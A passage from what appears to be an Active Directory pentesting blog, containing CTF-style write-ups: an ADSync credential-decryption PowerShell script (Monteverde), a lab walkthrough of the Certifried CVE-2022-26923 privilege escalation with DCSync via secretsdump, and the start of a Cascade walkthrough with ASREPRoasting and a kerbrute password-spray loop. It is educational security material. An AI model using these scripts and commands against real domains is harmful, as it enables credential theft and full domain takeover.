<p>which runs okay. Because we’re not really taking any action here. Just initializing an object of the type “System.Data.SqlClient.SqlConnection”. Nothing more.</p>

<p>We get the error on the <code class="language-plaintext highlighter-rouge">$client.Open()</code> part though:</p>

<p><img src="/assets/Monteverde/sql-error.jpg" alt="sql-error" /></p>

<p>Reading the sentences in the error tells us something about <strong>network-related</strong> errors and trying to reach the <strong>SQL server</strong> <em>remotely</em>.</p>

<p>we confirm this by consulting the <strong>Microsoft Documentation</strong> on connection strings <a href="/assets/Monteverde/https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=dotnet-plat-ext-6.0#system-data-sqlclient-sqlconnection-connectionstring">here</a>.</p>

<p>it says the <strong>“Data Source”</strong> is for the <strong>“The name or network address of the instance of SQL Server to which to connect.”</strong>.</p>

<p><img src="/assets/Monteverde/Data-Source-Doc.jpg" alt="Data-Source-Doc" /></p>

<p>so we change it up and just use <code class="language-plaintext highlighter-rouge">localhost</code> instead. But, we get a different error this time:</p>

<p><img src="/assets/Monteverde/sql-login-error.jpg" alt="sql-login-error" /></p>

<p>Seems that the connection string doesn’t use our <code class="language-plaintext highlighter-rouge">mhope</code> user credentials.</p>

<p><em>Looking again at the</em> <strong>Microsoft Documentation,</strong> we find info related to authentication:</p>

<p><img src="/assets/Monteverde/sql-auth.jpg" alt="sql-auth" /></p>

<p><em>After modyfing the connection string,</em> we get no errors when opening the connection. Seems promising! :)</p>

<p><img src="/assets/Monteverde/correct-conn-string.jpg" alt="correct-conn-string" /></p>

<h3 id="enough-troubleshooting-let-me-see-some-creds">Enough Troubleshooting. Let me see some creds!</h3>
<p><em>After modifying the connection string,</em> let’s go over what the script does in brief:</p>

<ol>
  <li>Defining the connection string: we’re connecting to the <strong>ADSync DB</strong> on the <strong>local computer</strong> using <strong>Windows Authentication</strong></li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$connection_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"</span><span class="w">
</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nv">$connection_string</span><span class="w">
</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Querying for the important bits to do the decryption: <code class="language-plaintext highlighter-rouge">keyset_id</code>, <code class="language-plaintext highlighter-rouge">instance_id</code> and <code class="language-plaintext highlighter-rouge">entropy</code> from the <code class="language-plaintext highlighter-rouge">mms_server_configuration</code> table</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"</span><span class="w">
</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nv">$key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetInt32</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
</span><span class="nv">$instance_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
</span><span class="nv">$entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">2</span><span class="p">)</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Obtaining the configuration items: <code class="language-plaintext highlighter-rouge">private_configuration_xml</code> and <code class="language-plaintext highlighter-rouge">encrypted_configuration</code> from the <code class="language-plaintext highlighter-rouge">mms_management_agent</code> table</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
</span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"</span><span class="w">
</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
</span><span class="nv">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
</span><span class="nv">$crypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Loading the <code class="language-plaintext highlighter-rouge">mcrypt.dll</code> into memory and carrying out the decryption using the keys extracted from <strong>Step #1</strong></li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add-type</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</span><span class="w">
</span><span class="nv">$km</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><span class="w">
</span><span class="nv">$km</span><span class="o">.</span><span class="nf">LoadKeySet</span><span class="p">(</span><span class="nv">$entropy</span><span class="p">,</span><span class="w"> </span><span class="nv">$instance_id</span><span class="p">,</span><span class="w"> </span><span class="nv">$key_id</span><span class="p">)</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetActiveCredentialKey</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key</span><span class="p">)</span><span class="w">
</span><span class="nv">$key2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetKey</span><span class="p">(</span><span class="nx">1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key2</span><span class="p">)</span><span class="w">
</span><span class="nv">$decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
</span><span class="nv">$key2</span><span class="o">.</span><span class="nf">DecryptBase64ToString</span><span class="p">(</span><span class="nv">$crypted</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$decrypted</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<ol>
  <li>Selecting the domain, username and password from the XML-formatted output and printing them to the screen.</li>
</ol>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$domain</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-domain']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Domain'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
</span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-user']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Username'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$decrypted</span><span class="w"> </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//attribute"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Password'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerText</span><span class="p">}}</span><span class="w">

</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Domain: "</span><span class="w">   </span><span class="o">+</span><span class="w"> </span><span class="nv">$domain</span><span class="o">.</span><span class="nf">Domain</span><span class="p">)</span><span class="w">
</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Username: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$username</span><span class="o">.</span><span class="nf">Username</span><span class="p">)</span><span class="w">
</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Password: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$password</span><span class="o">.</span><span class="nf">Password</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<p><em>With everything in place,</em> we run the script and get a clean set of creds ;]</p>

<p><img src="/assets/Monteverde/domain-admin-creds.jpg" alt="domain-admin-creds" /></p>

<p>The creds are good and the box is <strong>owned</strong> :D</p>

<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>

<h1 id="the-attack-in-brief">The Attack In Brief</h1>
<ol>
  <li>AD Certificates can be used for authentication.</li>
  <li>Certificates can be generated from <strong>templates</strong> in a <strong>Certificate Signing Request</strong> (CSR).</li>
  <li>There are <strong>two</strong> types of templates available in <strong>ADCS</strong> by default: User and Computer. They are <strong>accessible to anyone</strong> in the <code class="language-plaintext highlighter-rouge">Domain Users</code> or <code class="language-plaintext highlighter-rouge">Domain Computers</code> groups.</li>
  <li>The certificates they generate <strong>allow for authentication.</strong></li>
  <li><em>When generating a certificate for a computer object</em>, the computer template will check that computer’s <code class="language-plaintext highlighter-rouge">DNSHostname</code> property and <strong>will generate the certificate based on it</strong>.</li>
  <li><strong>Meaning:</strong> <em>if the computer’s</em> <code class="language-plaintext highlighter-rouge">DNSHostname</code> <em>is a Domain Controller’s,</em> you will get a certificate for that <strong>Domain Controller!</strong></li>
  <li><em>On another note, by default,</em> <strong>any authenticated user</strong> can join up to 10 computers to the domain.</li>
  <li><em>When a user joins a computer to the domain,</em> he will have the <strong>permission to modify</strong> that computer’s <code class="language-plaintext highlighter-rouge">DNSHostname</code> property.</li>
  <li><em>Combining the points above,</em> any authenticated user can add a computer to the domain and <em>alter</em> its <code class="language-plaintext highlighter-rouge">DNSHostname</code> to that of a <strong>Domain Controller</strong> and get a certificate as that domain controller.</li>
  <li><em>Using that certificate,</em> the user <em>can obtain</em> the computer account’s <strong>NTLM</strong> hash which can be used to <em>request a full copy of the domain’s hashes</em> (a.k.a <strong>perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack</strong>).</li>
</ol>

<hr />

<h1 id="tools-needed">Tools Needed</h1>
<ol>
  <li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
  <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
</ol>

<hr />

<h1 id="lab-setup-and-conditions">Lab Setup And Conditions</h1>
<h2 id="1-domain-controller-with-adcs-role-installed-dclablocal-192168126129">1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]</h2>
<p><img src="/assets/Certifried/dc-with-adcs-installed.jpg" alt="dc-with-adcs-installed" /></p>

<h2 id="2-kali-192168145128">2. Kali [192.168.145.128]</h2>
<p><img src="/assets/Certifried/kali-machine.jpg" alt="kali-machine" /></p>

<h2 id="3-normal-user-account-no-special-privileges">3. Normal User Account (No Special Privileges)</h2>
<p><img src="/assets/Certifried/normal-ad-user.jpg" alt="normal-ad-user" /></p>

<hr />

<h1 id="attack-demonstration">Attack Demonstration</h1>
<h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed DNSHostname</h2>
<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; <span class="nt">-user</span> <span class="s1">'&lt;NEW_COMPUTER_NAME&gt;'</span> <span class="nt">-dns</span> &lt;DC_FQDN&gt;
</code></pre></div></div>

<p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>

<p><img src="/assets/Certifried/proof-of-dns-hostname-spoofing.jpg" alt="proof-of-dns-hostname-spoofing" /></p>

<h2 id="2-requesting-a-domain-controllers-certificate">2. Requesting A Domain Controller’s Certificate</h2>
<p>we must first obtain the certificate authority’s name.</p>

<p>This can be done by visiting the <code class="language-plaintext highlighter-rouge">/certsrv</code> web directory on the server with ADCS installed and authenticating.</p>

<p><img src="/assets/Certifried/finding-out-the-ca-name.jpg" alt="finding-out-the-ca-name" /></p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-ca</span> &lt;CA_NAME&gt; <span class="nt">-template</span> Machine
</code></pre></div></div>

<p>Password = the same password generated from the computer creation in the previous step</p>

<p><img src="/assets/Certifried/requesting-dc-cert.jpg" alt="requesting-dc-cert" /></p>

<h2 id="3-using-the-domain-controllers-certificate-to-get-its-ntlm-hash">3. Using the Domain Controller’s Certificate To Get its NTLM Hash</h2>
<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth <span class="nt">-pfx</span> &lt;GENERATED_PFX_CERTIFICATE&gt;
</code></pre></div></div>

<p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>

<h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing DCSync As The Impersonated Domain Controller</h2>
<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-just-dc</span> &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-hashes</span> :&lt;RETRIEVED_HASH&gt;
</code></pre></div></div>

<p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>

<hr />

<h1 id="mitigation">Mitigation</h1>
<ol>
  <li>Applying the patch released by Microsoft <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">here</a>.</li>
  <li>Reducing certificate template permissions.</li>
  <li>Reducing the default user’s machine quota to zero. Only Administrators should have this privilege.</li>
</ol>

<hr />

<h1 id="references-and-credits">References and Credits</h1>
<ul>
  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
  <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered, reported and explained the vulnerability <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a> as well as created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="https://omnisl4sh.github.io/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/07/Cascade</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li><em>Noticing the open ports</em>: <strong>DNS, Kerberos, LDAP &amp; SMB</strong>, we know we’re up against a <strong>Windows Domain Controller</strong>.</li>
  <li><strong>LDAP Enumeration</strong> reveals a <em>base-64 encoded</em> password which was <em>embedded</em> in a unique <strong>Active Directory</strong> user attribute.</li>
  <li>Decoding the password grants us access to the <code class="language-plaintext highlighter-rouge">r.thompson</code> user who happens to have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">data</code> <strong>SMB</strong> share.</li>
  <li><em>Exploring the share,</em> we find a <code class="language-plaintext highlighter-rouge">VNC</code>-related <code class="language-plaintext highlighter-rouge">.reg</code> file which contains an encrypted password in hexadecimal format.</li>
  <li>We also find an e-mail about a <em>deleted</em> user (<code class="language-plaintext highlighter-rouge">TempAdmin</code>) who has a similar password to the normal (admin) user.</li>
  <li><em>After we crack the</em> <strong>VNC</strong> <em>password with a tool called</em> <code class="language-plaintext highlighter-rouge">vncpwd</code>, we gain access to the <code class="language-plaintext highlighter-rouge">s.smith</code> user.</li>
  <li><em>While enumerating SMB access for</em> <code class="language-plaintext highlighter-rouge">s.smith</code>, we find that he has <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">audit</code> share.</li>
  <li>The <code class="language-plaintext highlighter-rouge">audit</code> share contained an <code class="language-plaintext highlighter-rouge">sqlite3</code> database file. <em>When enumerating it,</em> we find an encrypted password for the <code class="language-plaintext highlighter-rouge">arksvc</code> user.</li>
  <li>We also find two files <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">CasCrypto.dll</code> which we reverse to find the necessary information to decrypt the <code class="language-plaintext highlighter-rouge">arksvc</code> password.</li>
  <li>We authenticate as the <code class="language-plaintext highlighter-rouge">arksvc</code> user and find that he’s a member of a special group: <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code>.</li>
  <li><em>Combining this information with the e-mail contents,</em> we’re enticed to check the deleted AD users.</li>
  <li><em>Using</em> <strong>PowerShell</strong> <em>to fetch the deleted users with all their properties,</em> we find the password for the <code class="language-plaintext highlighter-rouge">Administrator</code> account in a unique attribute of the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user. We use it to authenticate and we gain <strong>full access</strong> to the machine.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-06 11:02:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-06T11:03:13
|_  start_date: 2022-05-06T10:54:20
</code></pre></div></div>
<p><strong>DNS + Kerberos + LDAP + SMB = Domain Controller :D</strong></p>

<p><strong>WinRM</strong> = Shell Access maybe :)</p>

<p><em>From</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>version detection and scripts:</em></p>
<ul>
  <li><strong>OS:</strong> Windows Server 2008 R2 SP1</li>
  <li><strong>Domain Name:</strong> Cascade.local</li>
  <li><strong>Host name:</strong> CASC-DC1</li>
</ul>

<h3 id="checkpoint-listing-possible-enumerationexploitation-paths">Checkpoint: Listing Possible Enumeration/Exploitation Paths</h3>
<p><em>Having the port data,</em> we go over our <strong>game plan</strong>:</p>

<p><img src="/assets/Cascade/ad-gameplan-map.jpg" alt="ad-gameplan-map" /></p>

<h3 id="down-to-business-rpc">Down to business: RPC</h3>
<p><code class="language-plaintext highlighter-rouge">enum4linux-ng</code> (https://github.com/cddmp/enum4linux-ng) is a really nice revamp of the old <code class="language-plaintext highlighter-rouge">enum4linux</code> tool.</p>

<p>we run it using the <code class="language-plaintext highlighter-rouge">-A</code> switch as well as <code class="language-plaintext highlighter-rouge">-oY</code> to output into <strong>YAML format</strong>.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng <span class="nt">-A</span> 10.10.10.182 <span class="nt">-oY</span> e4lng-output
</code></pre></div></div>

<p>we get a bunch of cool stuff:</p>

<ul>
  <li><strong>Usernames</strong></li>
</ul>

<p><img src="/assets/Cascade/e4lng-output-users.jpg" alt="e4lng-output-users" /></p>

<ul>
  <li><strong>Groups</strong></li>
</ul>

<p><img src="/assets/Cascade/e4lng-output-groups.jpg" alt="e4lng-output-groups" /></p>

<ul>
  <li><strong>Password Policy</strong></li>
</ul>

<p><img src="/assets/Cascade/e4lng-output-pass-pol.jpg" alt="e4lng-output-pass-pol" /></p>

<p>This is great! We have a userlist that we can use to do <strong>ASREPRoasting</strong> and we can do <strong>Password Spraying</strong> without locking anyone out.</p>

<h3 id="time-saving-1-asreproasting">Time Saving #1: ASREPRoasting</h3>
<p><em>To save time,</em> we’re going to do the <strong>ASREPRoast</strong> first because it’s a quick check and has a high chance of giving us creds (<em>if we crack the hash</em>).</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.182 <span class="nt">-request</span> <span class="nt">-debug</span> <span class="nt">-usersfile</span> users.txt cascade.local/
</code></pre></div></div>

<p><strong>Note:</strong> <em>I generally prefer to use the</em> <code class="language-plaintext highlighter-rouge">-debug</code> <em>flag with everything. It can save me a lot of time in troubleshooting.</em></p>

<p><img src="/assets/Cascade/asreproast-results.jpg" alt="asreproast-results" /></p>

<p>We find no accounts that don’t require <strong>kerberoes preauthentication.</strong></p>

<p>we also notice some accounts got another type of error: <code class="language-plaintext highlighter-rouge">KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</code>. <em>more on those later :)</em></p>

<h3 id="time-saving-2-password-spraying-in-the-background">Time Saving #2: Password Spraying in the background</h3>
<p><em>Since the password policy contained no user lockout,</em> we’re good to go spraying :D</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>kerbrute passwordspray <span class="nt">--dc</span> 10.10.10.182 <span class="nt">-d</span> cascade.local users.txt <span class="nv">$i</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\+\].*'</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>what this does:</p>

<p>it will spray using common passwords and only show us the output if it catches something.</p>

<p>This is <em>mainly</em> to avoid filling up the screen with junk.</p>

<p>Note on the error we get when <strong>ASREPRoasting:</strong></p>

<p><em>Upon spraying,</em> we know that the users that got the <code class="language-plaintext highlighter-rouge">KDC_ERR_CLIENT_REVOKED</code> were in fact locked out.</p>

<p>Another benefit of the verbosity with <code class="language-plaintext highlighter-rouge">-v</code> :)</p>

<p><img src="/assets/Cascade/locked-out-users.jpg" alt="locked-out-users" /></p>

<h3 id="smb-enumeration">SMB Enumeration</h3>
<p><em>While we leave our spray running,</em> we’re going to enumerate <strong>SMB shares</strong> using <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>

<p><img src="/assets/Cascade/crackmapexec-smb-enum.jpg" alt="crackmapexec-smb-enum" /></p>

<p>Notice that we test with the <code class="language-plaintext highlighter-rouge">cascguest</code> user on the 3rd attempt.</p>

<p>This is because it was there in the <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> output.</p>

<p><img src="/assets/Cascade/casc-guest.jpg" alt="casc-guest" /></p>

<h3 id="ldap">LDAP</h3>
<p>We’re going to enumerate <strong>LDAP</strong> and see if we can find something there.</p>

<p><strong>Command:</strong></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s1">'dc=cascade,dc=local'</span>
</code></pre></div></div>

<p>The output was huge (6k+ lines). So we saved it to <code class="language-plaintext highlighter-rouge">ldap-output</code></p>

<p><img src="/assets/Cascade/ldap-output-huge.jpg" alt="ldap-output-huge" /></p>

<p>we’re going to use a <code class="language-plaintext highlighter-rouge">grep</code> with some <strong>Regex Kung Fu</strong> to get rid of any unnecessary information.</p>

<p><strong>Regex:</strong> <code class="language-plaintext highlighter-rouge">^\w+:</code></p>

<p><strong>English:</strong> Get us any line that starts (<code class="language-plaintext highlighter-rouge">^</code>) with a bunch of characters (<code class="language-plaintext highlighter-rouge">\w+</code>) followed by a semicolon (<code class="language-plaintext highlighter-rouge">:</code>).</p>

<p>We then follow up with a <code class="language-plaintext highlighter-rouge">sort</code> using the <code class="language-plaintext highlighter-rouge">-u</code> flag to get <em>only the signicant attributes.</em></p>

<p><img src="/assets/Cascade/regex-kung-fu.jpg" alt="regex-kung-fu" /></p>

<p>100 lines is much better XD</p>

<p><em>While sifting through the attributes,</em> we came across this:</p>

<p><img src="/assets/Cascade/ldap-uniq-attrib.jpg" alt="ldap-uniq-attrib" /></p>

<p><img src="/assets/Cascade/ldap-uniq-attrib-val.jpg" alt="ldap-uniq-attrib-val" /></p>

